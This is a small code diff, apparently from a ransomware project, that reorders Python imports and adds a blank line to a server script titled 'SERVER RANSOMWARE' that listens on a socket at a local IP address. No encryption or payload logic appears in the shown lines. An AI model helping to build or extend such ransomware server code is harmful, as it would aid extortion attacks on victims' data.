@@ -1,8 +1,8 @@
 # Import modules
+import __init__
 from time import sleep
 from threading import Thread
-from modules.system import System, Console
-from modules.sqlite import SqliteLog
+from modules.system import System, SqliteLog, Console
 from socket import socket, AF_INET, SOCK_STREAM
 
 
@@ -66,6 +66,7 @@ if __name__ == '__main__':
         Terminal.Title('SERVER RANSOMWARE')
         Terminal.Size(320, 240)
         Server('192.168.1.12', 19100).Listening()
+        
     except Exception as error:
         Console('127.0.0.0', error, 'Red')
         sleep(10)
